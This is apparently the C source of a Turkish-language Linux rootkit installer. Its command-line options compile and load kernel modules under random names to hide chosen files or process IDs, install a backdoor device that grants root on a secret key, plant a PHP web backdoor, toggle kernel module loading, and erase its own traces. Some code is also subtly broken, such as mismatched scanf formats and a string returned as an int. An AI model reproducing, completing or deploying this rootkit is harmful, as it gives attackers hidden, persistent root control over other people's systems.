#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>
#include "gamlibaykus.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>



int main(int argc, char **argv)
{
char *sikim;
int *procesid;
char operasyon[500];
char sikimm[40];
char insmodd[300];
banner();
if(argc==2) {
	system("echo 0 > /proc/sys/kernel/modules_disabled"); // Kernel Modulleri yuklemeye izin ver
	if(strcmp(argv[1], "-fileseek")==0){
		sikim = randomisimat();
		sprintf(sikimm,"%s.o",sikim);
		printf("[+] Gizlenecek Dosya : ");
		scanf("%s",&operasyon);
		sprintf(insmodd,"insmod %s.ko hide=%s",sikim,operasyon);
	    strcat(sikim,".c");
		makefilegen(sikimm);
		hidefile(sikim);		
		system("make");
  		system("chmod 777 *");
  		system(insmodd);
		free(sikim);
  		
	}else if(strcmp(argv[1], "-procseek")==0){
		sikim = randomisimat();
		sprintf(sikimm,"%s.o",sikim);
		printf("[+] Gizlenecek Process id : ");
		scanf("%d",&procesid);
		sprintf(insmodd,"insmod %s.ko hideproc.ko verb=1 target_pid=%d",sikim,procesid);
	    strcat(sikim, ".c");
		makefilegen(sikimm);
		procseek(sikim);		
		system("make");
  		system("chmod 777 *");
  		system(insmodd);
  		free(sikim);
		
	}else if(strcmp(argv[1], "-rootdevice")==0){
		sikim = randomisimat();
		sprintf(sikimm,"%s.o",sikim);
		printf("[+] Root Device Yetki Keyini Girin: ");
		scanf("%d",&operasyon);
		sprintf(insmodd,"insmod %s.ko magic=%s",sikim,operasyon);
	    strcat(sikim, ".c");
		makefilegen(sikimm);
		rootdevice(sikim); 	
		system("make");
  		system("chmod 777 *");
  		system(insmodd);
  		printf("%s",insmodd);
  		printf("echo GIRDIGINIZ OZEL KEY > /dev/ttyR0 Komutunu calistirdiginizda Root yetkisi elde edeceksiniz");
  		free(sikim);
			
	}else if(strcmp(argv[1], "-insdoor")==0){
		
		phpback();
		
		
	}else if(strcmp(argv[1], "-locklkm")==0){
		printf("[+] Bu izni elde etmek icin makineyi yeniden baslatmaniz gerekebilir !");
		system("echo 1 > /proc/sys/kernel/modules_disabled");
		
	}else if(strcmp(argv[1], "-uninstall")==0){
			remove("/var/baba/index.php");
			remove("/var/baba/baba.php");
			remove(argv[0]);
      		printf("[!] Dosyalar Kaldirildi.."); 
	}else{
	system("clear");
	helperr();
	}
	
	
	
	
}else{
	system("clear");
	helperr();
}
	return 0;
}


void dummy()
{
	__asm__("nop");
}





const char alphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789";


int intN(int n) { return rand() % n; }


char *randomString(int lencik) {
  char *rstr = malloc((lencik + 1) * sizeof(char));
  int doncek;
  for (doncek = 0; doncek < lencik; doncek++) {
    rstr[doncek] = alphabet[intN(strlen(alphabet))];
  }
  rstr[lencik] = '\0';
  return rstr;
}

int randomisimat() {

  srand(time(NULL));

  char *k;
  k = randomString(10);
  
  return k;
}



